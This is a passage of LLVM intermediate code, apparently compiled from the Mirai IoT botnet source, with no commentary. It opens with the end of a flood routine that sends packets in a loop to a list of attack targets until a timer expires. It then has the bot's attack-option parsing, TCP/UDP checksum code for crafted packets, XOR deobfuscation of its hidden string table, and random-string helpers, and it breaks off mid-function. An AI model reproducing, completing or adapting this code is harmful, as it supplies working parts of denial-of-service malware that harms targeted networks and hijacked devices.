  %470 = bitcast %union.__CONST_SOCKADDR_ARG* %43 to %struct.sockaddr**
  %471 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %472 = load i32, i32* %11, align 4
  %473 = sext i32 %472 to i64
  %474 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %471, i64 %473
  %475 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %474, i32 0, i32 0
  %476 = bitcast %struct.sockaddr_in* %475 to %struct.sockaddr*
  store %struct.sockaddr* %476, %struct.sockaddr** %470, align 8
  %477 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %43, i32 0, i32 0
  %478 = load %struct.sockaddr*, %struct.sockaddr** %477, align 8
  %479 = call i64 @sendto(i32 noundef %465, i8* noundef %466, i64 noundef %469, i32 noundef 16384, %struct.sockaddr* %478, i32 noundef 16)
  br label %480

480:                                              ; preds = %413
  %481 = load i32, i32* %11, align 4
  %482 = add nsw i32 %481, 1
  store i32 %482, i32* %11, align 4
  br label %265, !llvm.loop !10

483:                                              ; preds = %265
  %484 = call i64 @time(i64* noundef null) #4
  %485 = load i32, i32* %24, align 4
  %486 = sext i32 %485 to i64
  %487 = icmp sgt i64 %484, %486
  br i1 %487, label %488, label %489

488:                                              ; preds = %483
  br label %490

489:                                              ; preds = %483
  br label %264

490:                                              ; preds = %488, %100, %94
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @attack_get_opt_int(i8 noundef zeroext %0, %struct.attack_option* noundef %1, i8 noundef zeroext %2, i32 noundef %3) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 noundef zeroext %11, %struct.attack_option* noundef %12, i8 noundef zeroext %13, i8* noundef null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  %16 = icmp eq i8* %15, null
  br i1 %16, label %17, label %19

17:                                               ; preds = %4
  %18 = load i32, i32* %9, align 4
  store i32 %18, i32* %5, align 4
  br label %22

19:                                               ; preds = %4
  %20 = load i8*, i8** %10, align 8
  %21 = call i32 @util_atoi(i8* noundef %20, i32 noundef 10)
  store i32 %21, i32* %5, align 4
  br label %22

22:                                               ; preds = %19, %17
  %23 = load i32, i32* %5, align 4
  ret i32 %23
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i8* @attack_get_opt_str(i8 noundef zeroext %0, %struct.attack_option* noundef %1, i8 noundef zeroext %2, i8* noundef %3) #0 {
  %5 = alloca i8*, align 8
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i8* %3, i8** %9, align 8
  store i32 0, i32* %10, align 4
  store i32 0, i32* %10, align 4
  br label %11

11:                                               ; preds = %35, %4
  %12 = load i32, i32* %10, align 4
  %13 = load i8, i8* %6, align 1
  %14 = zext i8 %13 to i32
  %15 = icmp slt i32 %12, %14
  br i1 %15, label %16, label %38

16:                                               ; preds = %11
  %17 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %18 = load i32, i32* %10, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %17, i64 %19
  %21 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %20, i32 0, i32 1
  %22 = load i8, i8* %21, align 8
  %23 = zext i8 %22 to i32
  %24 = load i8, i8* %8, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp eq i32 %23, %25
  br i1 %26, label %27, label %34

27:                                               ; preds = %16
  %28 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %29 = load i32, i32* %10, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %28, i64 %30
  %32 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %31, i32 0, i32 0
  %33 = load i8*, i8** %32, align 8
  store i8* %33, i8** %5, align 8
  br label %40

34:                                               ; preds = %16
  br label %35

35:                                               ; preds = %34
  %36 = load i32, i32* %10, align 4
  %37 = add nsw i32 %36, 1
  store i32 %37, i32* %10, align 4
  br label %11, !llvm.loop !11

38:                                               ; preds = %11
  %39 = load i8*, i8** %9, align 8
  store i8* %39, i8** %5, align 8
  br label %40

40:                                               ; preds = %38, %27
  %41 = load i8*, i8** %5, align 8
  ret i8* %41
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local zeroext i16 @checksum_generic(i16* noundef %0, i32 noundef %1) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  store i64 0, i64* %5, align 8
  br label %6

6:                                                ; preds = %16, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp ugt i32 %7, 1
  br i1 %8, label %9, label %19

9:                                                ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = add i64 %14, %13
  store i64 %15, i64* %5, align 8
  br label %16

16:                                               ; preds = %9
  %17 = load i32, i32* %4, align 4
  %18 = sub i32 %17, 2
  store i32 %18, i32* %4, align 4
  br label %6, !llvm.loop !12

19:                                               ; preds = %6
  %20 = load i32, i32* %4, align 4
  %21 = icmp eq i32 %20, 1
  br i1 %21, label %22, label %29

22:                                               ; preds = %19
  %23 = load i16*, i16** %3, align 8
  %24 = load i16, i16* %23, align 2
  %25 = trunc i16 %24 to i8
  %26 = sext i8 %25 to i64
  %27 = load i64, i64* %5, align 8
  %28 = add i64 %27, %26
  store i64 %28, i64* %5, align 8
  br label %29

29:                                               ; preds = %22, %19
  %30 = load i64, i64* %5, align 8
  %31 = lshr i64 %30, 16
  %32 = load i64, i64* %5, align 8
  %33 = and i64 %32, 65535
  %34 = add i64 %31, %33
  store i64 %34, i64* %5, align 8
  %35 = load i64, i64* %5, align 8
  %36 = lshr i64 %35, 16
  %37 = load i64, i64* %5, align 8
  %38 = add i64 %37, %36
  store i64 %38, i64* %5, align 8
  %39 = load i64, i64* %5, align 8
  %40 = xor i64 %39, -1
  %41 = trunc i64 %40 to i16
  ret i16 %41
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local zeroext i16 @checksum_tcpudp(%struct.iphdr* noundef %0, i8* noundef %1, i16 noundef zeroext %2, i32 noundef %3) #0 {
  %5 = alloca %struct.iphdr*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i16, align 2
  %8 = alloca i32, align 4
  %9 = alloca i16*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %5, align 8
  store i8* %1, i8** %6, align 8
  store i16 %2, i16* %7, align 2
  store i32 %3, i32* %8, align 4
  %14 = load i8*, i8** %6, align 8
  %15 = bitcast i8* %14 to i16*
  store i16* %15, i16** %9, align 8
  %16 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %17 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %16, i32 0, i32 8
  %18 = load i32, i32* %17, align 4
  store i32 %18, i32* %10, align 4
  %19 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %20 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %19, i32 0, i32 9
  %21 = load i32, i32* %20, align 4
  store i32 %21, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %22 = load i32, i32* %8, align 4
  store i32 %22, i32* %13, align 4
  br label %23

23:                                               ; preds = %26, %4
  %24 = load i32, i32* %8, align 4
  %25 = icmp sgt i32 %24, 1
  br i1 %25, label %26, label %36

26:                                               ; preds = %23
  %27 = load i16*, i16** %9, align 8
  %28 = load i16, i16* %27, align 2
  %29 = zext i16 %28 to i32
  %30 = load i32, i32* %12, align 4
  %31 = add i32 %30, %29
  store i32 %31, i32* %12, align 4
  %32 = load i16*, i16** %9, align 8
  %33 = getelementptr inbounds i16, i16* %32, i32 1
  store i16* %33, i16** %9, align 8
  %34 = load i32, i32* %8, align 4
  %35 = sub nsw i32 %34, 2
  store i32 %35, i32* %8, align 4
  br label %23, !llvm.loop !13

36:                                               ; preds = %23
  %37 = load i32, i32* %8, align 4
  %38 = icmp eq i32 %37, 1
  br i1 %38, label %39, label %46

39:                                               ; preds = %36
  %40 = load i16*, i16** %9, align 8
  %41 = bitcast i16* %40 to i8*
  %42 = load i8, i8* %41, align 1
  %43 = zext i8 %42 to i32
  %44 = load i32, i32* %12, align 4
  %45 = add i32 %44, %43
  store i32 %45, i32* %12, align 4
  br label %46

46:                                               ; preds = %39, %36
  %47 = load i32, i32* %10, align 4
  %48 = lshr i32 %47, 16
  %49 = and i32 %48, 65535
  %50 = load i32, i32* %12, align 4
  %51 = add i32 %50, %49
  store i32 %51, i32* %12, align 4
  %52 = load i32, i32* %10, align 4
  %53 = and i32 %52, 65535
  %54 = load i32, i32* %12, align 4
  %55 = add i32 %54, %53
  store i32 %55, i32* %12, align 4
  %56 = load i32, i32* %11, align 4
  %57 = lshr i32 %56, 16
  %58 = and i32 %57, 65535
  %59 = load i32, i32* %12, align 4
  %60 = add i32 %59, %58
  store i32 %60, i32* %12, align 4
  %61 = load i32, i32* %11, align 4
  %62 = and i32 %61, 65535
  %63 = load i32, i32* %12, align 4
  %64 = add i32 %63, %62
  store i32 %64, i32* %12, align 4
  %65 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %66 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %65, i32 0, i32 6
  %67 = load i8, i8* %66, align 1
  %68 = zext i8 %67 to i16
  %69 = call zeroext i16 @htons(i16 noundef zeroext %68) #5
  %70 = zext i16 %69 to i32
  %71 = load i32, i32* %12, align 4
  %72 = add i32 %71, %70
  store i32 %72, i32* %12, align 4
  %73 = load i16, i16* %7, align 2
  %74 = zext i16 %73 to i32
  %75 = load i32, i32* %12, align 4
  %76 = add i32 %75, %74
  store i32 %76, i32* %12, align 4
  br label %77

77:                                               ; preds = %81, %46
  %78 = load i32, i32* %12, align 4
  %79 = lshr i32 %78, 16
  %80 = icmp ne i32 %79, 0
  br i1 %80, label %81, label %87

81:                                               ; preds = %77
  %82 = load i32, i32* %12, align 4
  %83 = and i32 %82, 65535
  %84 = load i32, i32* %12, align 4
  %85 = lshr i32 %84, 16
  %86 = add i32 %83, %85
  store i32 %86, i32* %12, align 4
  br label %77, !llvm.loop !14

87:                                               ; preds = %77
  %88 = load i32, i32* %12, align 4
  %89 = xor i32 %88, -1
  %90 = trunc i32 %89 to i16
  ret i16 %90
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @rand_next() #0 {
  %1 = alloca i32, align 4
  %2 = load i32, i32* @x, align 4
  store i32 %2, i32* %1, align 4
  %3 = load i32, i32* %1, align 4
  %4 = shl i32 %3, 11
  %5 = load i32, i32* %1, align 4
  %6 = xor i32 %5, %4
  store i32 %6, i32* %1, align 4
  %7 = load i32, i32* %1, align 4
  %8 = lshr i32 %7, 8
  %9 = load i32, i32* %1, align 4
  %10 = xor i32 %9, %8
  store i32 %10, i32* %1, align 4
  %11 = load i32, i32* @y, align 4
  store i32 %11, i32* @x, align 4
  %12 = load i32, i32* @z, align 4
  store i32 %12, i32* @y, align 4
  %13 = load i32, i32* @w, align 4
  store i32 %13, i32* @z, align 4
  %14 = load i32, i32* @w, align 4
  %15 = lshr i32 %14, 19
  %16 = load i32, i32* @w, align 4
  %17 = xor i32 %16, %15
  store i32 %17, i32* @w, align 4
  %18 = load i32, i32* %1, align 4
  %19 = load i32, i32* @w, align 4
  %20 = xor i32 %19, %18
  store i32 %20, i32* @w, align 4
  %21 = load i32, i32* @w, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @rand_alpha_str(i8* noundef %0, i32 noundef %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca [64 x i8], align 16
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  call void @table_unlock_val(i8 noundef zeroext 39)
  %6 = getelementptr inbounds [64 x i8], [64 x i8]* %5, i64 0, i64 0
  %7 = call i8* @table_retrieve_val(i32 noundef 39, i32* noundef null)
  %8 = call i8* @strcpy(i8* noundef %6, i8* noundef %7) #4
  br label %9

9:                                                ; preds = %13, %2
  %10 = load i32, i32* %4, align 4
  %11 = add nsw i32 %10, -1
  store i32 %11, i32* %4, align 4
  %12 = icmp ne i32 %10, 0
  br i1 %12, label %13, label %23

13:                                               ; preds = %9
  %14 = call i32 @rand_next()
  %15 = getelementptr inbounds [64 x i8], [64 x i8]* %5, i64 0, i64 0
  %16 = call i32 @util_strlen(i8* noundef %15)
  %17 = urem i32 %14, %16
  %18 = zext i32 %17 to i64
  %19 = getelementptr inbounds [64 x i8], [64 x i8]* %5, i64 0, i64 %18
  %20 = load i8, i8* %19, align 1
  %21 = load i8*, i8** %3, align 8
  %22 = getelementptr inbounds i8, i8* %21, i32 1
  store i8* %22, i8** %3, align 8
  store i8 %20, i8* %21, align 1
  br label %9, !llvm.loop !15

23:                                               ; preds = %9
  call void @table_lock_val(i8 noundef zeroext 39)
  ret void
}

; Function Attrs: nounwind
declare i8* @strcpy(i8* noundef, i8* noundef) #1

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @table_unlock_val(i8 noundef zeroext %0) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [43 x %struct.table_value], [43 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 noundef zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define internal void @toggle_obf(i8 noundef zeroext %0) #0 {
  %2 = alloca i8, align 1
  %3 = alloca i32, align 4
  %4 = alloca %struct.table_value*, align 8
  %5 = alloca i8, align 1
  %6 = alloca i8, align 1
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  store i32 0, i32* %3, align 4
  %9 = load i8, i8* %2, align 1
  %10 = zext i8 %9 to i64
  %11 = getelementptr inbounds [43 x %struct.table_value], [43 x %struct.table_value]* @table, i64 0, i64 %10
  store %struct.table_value* %11, %struct.table_value** %4, align 8
  %12 = load i32, i32* @table_key, align 4
  %13 = and i32 %12, 255
  %14 = trunc i32 %13 to i8
  store i8 %14, i8* %5, align 1
  %15 = load i32, i32* @table_key, align 4
  %16 = lshr i32 %15, 8
  %17 = and i32 %16, 255
  %18 = trunc i32 %17 to i8
  store i8 %18, i8* %6, align 1
  %19 = load i32, i32* @table_key, align 4
  %20 = lshr i32 %19, 16
  %21 = and i32 %20, 255
  %22 = trunc i32 %21 to i8
  store i8 %22, i8* %7, align 1
  %23 = load i32, i32* @table_key, align 4
  %24 = lshr i32 %23, 24
  %25 = and i32 %24, 255
  %26 = trunc i32 %25 to i8
  store i8 %26, i8* %8, align 1
  store i32 0, i32* %3, align 4
  br label %27

27:                                               ; preds = %83, %1
  %28 = load i32, i32* %3, align 4
  %29 = load %struct.table_value*, %struct.table_value** %4, align 8
  %30 = getelementptr inbounds %struct.table_value, %struct.table_value* %29, i32 0, i32 1
  %31 = load i16, i16* %30, align 8
  %32 = zext i16 %31 to i32
  %33 = icmp slt i32 %28, %32
  br i1 %33, label %34, label %86

34:                                               ; preds = %27
  %35 = load i8, i8* %5, align 1
  %36 = zext i8 %35 to i32
  %37 = load %struct.table_value*, %struct.table_value** %4, align 8
  %38 = getelementptr inbounds %struct.table_value, %struct.table_value* %37, i32 0, i32 0
  %39 = load i8*, i8** %38, align 8
  %40 = load i32, i32* %3, align 4
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds i8, i8* %39, i64 %41
  %43 = load i8, i8* %42, align 1
  %44 = sext i8 %43 to i32
  %45 = xor i32 %44, %36
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %42, align 1
  %47 = load i8, i8* %6, align 1
  %48 = zext i8 %47 to i32
  %49 = load %struct.table_value*, %struct.table_value** %4, align 8
  %50 = getelementptr inbounds %struct.table_value, %struct.table_value* %49, i32 0, i32 0
  %51 = load i8*, i8** %50, align 8
  %52 = load i32, i32* %3, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %51, i64 %53
  %55 = load i8, i8* %54, align 1
  %56 = sext i8 %55 to i32
  %57 = xor i32 %56, %48
  %58 = trunc i32 %57 to i8
  store i8 %58, i8* %54, align 1
  %59 = load i8, i8* %7, align 1
  %60 = zext i8 %59 to i32
  %61 = load %struct.table_value*, %struct.table_value** %4, align 8
  %62 = getelementptr inbounds %struct.table_value, %struct.table_value* %61, i32 0, i32 0
  %63 = load i8*, i8** %62, align 8
  %64 = load i32, i32* %3, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds i8, i8* %63, i64 %65
  %67 = load i8, i8* %66, align 1
  %68 = sext i8 %67 to i32
  %69 = xor i32 %68, %60
  %70 = trunc i32 %69 to i8
  store i8 %70, i8* %66, align 1
  %71 = load i8, i8* %8, align 1
  %72 = zext i8 %71 to i32
  %73 = load %struct.table_value*, %struct.table_value** %4, align 8
  %74 = getelementptr inbounds %struct.table_value, %struct.table_value* %73, i32 0, i32 0
  %75 = load i8*, i8** %74, align 8
  %76 = load i32, i32* %3, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds i8, i8* %75, i64 %77
  %79 = load i8, i8* %78, align 1
  %80 = sext i8 %79 to i32
  %81 = xor i32 %80, %72
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %78, align 1
  br label %83

83:                                               ; preds = %34
  %84 = load i32, i32* %3, align 4
  %85 = add nsw i32 %84, 1
  store i32 %85, i32* %3, align 4
  br label %27, !llvm.loop !16

86:                                               ; preds = %27
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @table_lock_val(i8 noundef zeroext %0) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [43 x %struct.table_value], [43 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 noundef zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i8* @table_retrieve_val(i32 noundef %0, i32* noundef %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32*, align 8
  %5 = alloca %struct.table_value*, align 8
  store i32 %0, i32* %3, align 4
  store i32* %1, i32** %4, align 8
  %6 = load i32, i32* %3, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [43 x %struct.table_value], [43 x %struct.table_value]* @table, i64 0, i64 %7
  store %struct.table_value* %8, %struct.table_value** %5, align 8
  %9 = load i32*, i32** %4, align 8
  %10 = icmp ne i32* %9, null
  br i1 %10, label %11, label %17

11:                                               ; preds = %2
  %12 = load %struct.table_value*, %struct.table_value** %5, align 8
  %13 = getelementptr inbounds %struct.table_value, %struct.table_value* %12, i32 0, i32 1
  %14 = load i16, i16* %13, align 8
  %15 = zext i16 %14 to i32
  %16 = load i32*, i32** %4, align 8
  store i32 %15, i32* %16, align 4
  br label %17

17:                                               ; preds = %11, %2
  %18 = load %struct.table_value*, %struct.table_value** %5, align 8
  %19 = getelementptr inbounds %struct.table_value, %struct.table_value* %18, i32 0, i32 0
  %20 = load i8*, i8** %19, align 8
  ret i8* %20
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @util_strlen(i8* noundef %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %3, align 4
  br label %4

4:                                                ; preds = %10, %1
  %5 = load i8*, i8** %2, align 8
  %6 = getelementptr inbounds i8, i8* %5, i32 1
  store i8* %6, i8** %2, align 8
  %7 = load i8, i8* %5, align 1
  %8 = sext i8 %7 to i32
  %9 = icmp ne i32 %8, 0
  br i1 %9, label %10, label %13

10:                                               ; preds = %4
  %11 = load i32, i32* %3, align 4
  %12 = add nsw i32 %11, 1
  store i32 %12, i32* %3, align 4
  br label %4, !llvm.loop !17

13:                                               ; preds = %4
  %14 = load i32, i32* %3, align 4
  ret i32 %14
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @util_memcpy(i8* noundef %0, i8* noundef %1, i32 noundef %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  store i32 %2, i32* %6, align 4
  %9 = load i8*, i8** %4, align 8
  store i8* %9, i8** %7, align 8
  %10 = load i8*, i8** %5, align 8
  store i8* %10, i8** %8, align 8
  br label %11

11:                                               ; preds = %15, %3
  %12 = load i32, i32* %6, align 4
  %13 = add nsw i32 %12, -1
  store i32 %13, i32* %6, align 4
  %14 = icmp ne i32 %12, 0
  br i1 %14, label %15, label %21

15:                                               ; preds = %11
  %16 = load i8*, i8** %8, align 8
  %17 = getelementptr inbounds i8, i8* %16, i32 1
  store i8* %17, i8** %8, align 8
  %18 = load i8, i8* %16, align 1
  %19 = load i8*, i8** %7, align 8
  %20 = getelementptr inbounds i8, i8* %19, i32 1
  store i8* %20, i8** %7, align 8
  store i8 %18, i8* %19, align 1
  br label %11, !llvm.loop !18

21:                                               ; preds = %11
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @util_atoi(i8* noundef %0, i32 noundef %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  %6 = alloca i32, align 4
  %7 = alloca i64, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  store i32 0, i32* %8, align 4
  br label %11

11:                                               ; preds = %16, %2
  %12 = load i8*, i8** %3, align 8
  %13 = getelementptr inbounds i8, i8* %12, i32 1
  store i8* %13, i8** %3, align 8
  %14 = load i8, i8* %12, align 1
  %15 = sext i8 %14 to i32
  store i32 %15, i32* %6, align 4
  br label %16

16:                                               ; preds = %11
  %17 = load i32, i32* %6, align 4
  %18 = trunc i32 %17 to i8
  %19 = call i32 @util_isspace(i8 noundef signext %18)
  %20 = icmp ne i32 %19, 0
  br i1 %20, label %11, label %21, !llvm.loop !19

21:                                               ; preds = %16
  %22 = load i32, i32* %6, align 4
  %23 = icmp eq i32 %22, 45
  br i1 %23, label %24, label %29

24:                                               ; preds = %21
  store i32 1, i32* %8, align 4
  %25 = load i8*, i8** %3, align 8
  %26 = getelementptr inbounds i8, i8* %25, i32 1
  store i8* %26, i8** %3, align 8
  %27 = load i8, i8* %25, align 1
  %28 = sext i8 %27 to i32
  store i32 %28, i32* %6, align 4
  br label %38

29:                                               ; preds = %21
  %30 = load i32, i32* %6, align 4
  %31 = icmp eq i32 %30, 43
  br i1 %31, label %32, label %37

32:                                               ; preds = %29
  %33 = load i8*, i8** %3, align 8
  %34 = getelementptr inbounds i8, i8* %33, i32 1
  store i8* %34, i8** %3, align 8
  %35 = load i8, i8* %33, align 1
  %36 = sext i8 %35 to i32
  store i32 %36, i32* %6, align 4
  br label %37

37:                                               ; preds = %32, %29
  br label %38

38:                                               ; preds = %37, %24
  %39 = load i32, i32* %8, align 4
  %40 = icmp ne i32 %39, 0
  %41 = zext i1 %40 to i64
  %42 = select i1 %40, i64 -9223372036854775808, i64 9223372036854775807
  store i64 %42, i64* %7, align 8
  %43 = load i64, i64* %7, align 8
  %44 = load i32, i32* %4, align 4
  %45 = sext i32 %44 to i64
  %46 = urem i64 %43, %45
  %47 = trunc i64 %46 to i32
  store i32 %47, i32* %10, align 4
  %48 = load i32, i32* %4, align 4
  %49 = sext i32 %48 to i64
  %50 = load i64, i64* %7, align 8
  %51 = udiv i64 %50, %49
  store i64 %51, i64* %7, align 8
  store i64 0, i64* %5, align 8
  store i32 0, i32* %9, align 4
  br label %52

52:                                               ; preds = %107, %38
  %53 = load i32, i32* %6, align 4
  %54 = trunc i32 %53 to i8
  %55 = call i32 @util_isdigit(i8 noundef signext %54)
  %56 = icmp ne i32 %55, 0
  br i1 %56, label %57, label %60

57:                                               ; preds = %52
  %58 = load i32, i32* %6, align 4
  %59 = sub nsw i32 %58, 48
  store i32 %59, i32* %6, align 4
  br label %76

60:                                               ; preds = %52
  %61 = load i32, i32* %6, align 4
  %62 = trunc i32 %61 to i8
  %63 = call i32 @util_isalpha(i8 noundef signext %62)
  %64 = icmp ne i32 %63, 0
  br i1 %64, label %65, label %74

65:                                               ; preds = %60
  %66 = load i32, i32* %6, align 4
  %67 = trunc i32 %66 to i8
  %68 = call i32 @util_isupper(i8 noundef signext %67)
  %69 = icmp ne i32 %68, 0
  %70 = zext i1 %69 to i64
  %71 = select i1 %69, i32 55, i32 87
  %72 = load i32, i32* %6, align 4
  %73 = sub nsw i32 %72, %71
  store i32 %73, i32* %6, align 4
  br label %75

74:                                               ; preds = %60
  br label %112

75:                                               ; preds = %65
  br label %76

76:                                               ; preds = %75, %57
  %77 = load i32, i32* %6, align 4
  %78 = load i32, i32* %4, align 4
  %79 = icmp sge i32 %77, %78
  br i1 %79, label %80, label %81

80:                                               ; preds = %76
  br label %112

81:                                               ; preds = %76
  %82 = load i32, i32* %9, align 4
  %83 = icmp slt i32 %82, 0
  br i1 %83, label %96, label %84

84:                                               ; preds = %81
  %85 = load i64, i64* %5, align 8
  %86 = load i64, i64* %7, align 8
  %87 = icmp ugt i64 %85, %86
  br i1 %87, label %96, label %88

88:                                               ; preds = %84
  %89 = load i64, i64* %5, align 8
  %90 = load i64, i64* %7, align 8
  %91 = icmp eq i64 %89, %90
  br i1 %91, label %92, label %97

92:                                               ; preds = %88
  %93 = load i32, i32* %6, align 4
  %94 = load i32, i32* %10, align 4
  %95 = icmp sgt i32 %93, %94
  br i1 %95, label %96, label %97

96:                                               ; preds = %92, %84, %81
  store i32 -1, i32* %9, align 4
  br label %106

97:                                               ; preds = %92, %88
  store i32 1, i32* %9, align 4
  %98 = load i32, i32* %4, align 4
  %99 = sext i32 %98 to i64
  %100 = load i64, i64* %5, align 8
  %101 = mul i64 %100, %99
  store i64 %101, i64* %5, align 8
  %102 = load i32, i32* %6, align 4
  %103 = sext i32 %102 to i64
  %104 = load i64, i64* %5, align 8
  %105 = add i64 %104, %103
  store i64 %105, i64* %5, align 8
  br label %106

106:                                              ; preds = %97, %96
  br label %107

107:                                              ; preds = %106
  %108 = load i8*, i8** %3, align 8
  %109 = getelementptr inbounds i8, i8* %108, i32 1
  store i8* %109, i8** %3, align 8
  %110 = load i8, i8* %108, align 1
  %111 = sext i8 %110 to i32
  store i32 %111, i32* %6, align 4
  br label %52

112:                                              ; preds = %80, %74
  %113 = load i32, i32* %9, align 4
  %114 = icmp slt i32 %113, 0
  br i1 %114, label %115, label %120

115:                                              ; preds = %112
  %116 = load i32, i32* %8, align 4
  %117 = icmp ne i32 %116, 0
  %118 = zext i1 %117 to i64
  %119 = select i1 %117, i64 -9223372036854775808, i64 9223372036854775807
  store i64 %119, i64* %5, align 8
  br label %127

120:                                              ; preds = %112
  %121 = load i32, i32* %8, align 4
  %122 = icmp ne i32 %121, 0
  br i1 %122, label %123, label %126

123:                                              ; preds = %120
  %124 = load i64, i64* %5, align 8
  %125 = sub i64 0, %124
  store i64 %125, i64* %5, align 8
  br label %126

126:                                              ; preds = %123, %120
  br label %127

127:                                              ; preds = %126, %115
  %128 = load i64, i64* %5, align 8
  %129 = trunc i64 %128 to i32
  ret i32 %129
}

; Function Attrs: noinline nounwind sspstrong uwtable
define internal i32 @util_isspace(i8 noundef signext %0) #0 {
  %2 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %3 = load i8, i8* %2, align 1
  %4 = sext i8 %3 to i32
  %5 = icmp eq i32 %4, 32
  br i1 %5, label %18, label %6

6:                                                ; preds = %1
  %7 = load i8, i8* %2, align 1
  %8 = sext i8 %7 to i32
  %9 = icmp eq i32 %8, 9
  br i1 %9, label %18, label %10

10:                                               ; preds = %6
  %11 = load i8, i8* %2, align 1
  %12 = sext i8 %11 to i32
  %13 = icmp eq i32 %12, 10
  br i1 %13, label %18, label %14

14:                                               ; preds = %10
  %15 = load i8, i8* %2, align 1
  %16 = sext i8 %15 to i32
  %17 = icmp eq i32 %16, 10
  br label %18

18:                                               ; preds = %14, %10, %6, %1
